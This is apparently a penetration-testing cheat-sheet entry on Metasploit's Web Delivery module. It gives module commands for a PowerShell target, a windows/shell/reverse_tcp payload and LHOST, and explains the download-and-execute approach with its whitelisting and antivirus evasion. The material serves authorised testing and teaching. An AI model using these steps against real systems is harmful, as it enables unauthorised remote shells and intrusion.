
## Metasploit Web Delivery

If the target doesn't have any vulnerable services running, we can use metasploit Web Delivery to get access to the system.

This module quickly fires up a web server that serves a payload. The module will provide a command to be run on the target machine based on the selected target. The priveded command will download and execute a payload using either a specified scripting language interpreter or "squiblydoo" via regsvr32.exe for bypassing application whitelisting. The main purpose of this module is to quickly establish a session on a target machine when the attacker has to manually type in the command: e.g. Command Injection, RDP Session, Local Access etc. This attack vector does not write to disk so it is less likely to trigger AV.

See available targets

```plaintext
show targets
```

_For example, set the target to powershell_

```plaintext
set target PSH
set target PSH\ (Binary)
```

_Set the payload for a simple command shell session_

```plaintext
set payload windows/shell/reverse_tcp
```

_We can disable powershell code for being encoded in BASE64\*_

```plaintext
set PSH-EncodedCommand false
```

```plaintext
set LHOST eth1
```

After running the “exploit” command, it will generate a powershell code wich must be manually copied to the victim system cmd. After that, check metasploit for a new session in wich we should have simple command shell session on the target.
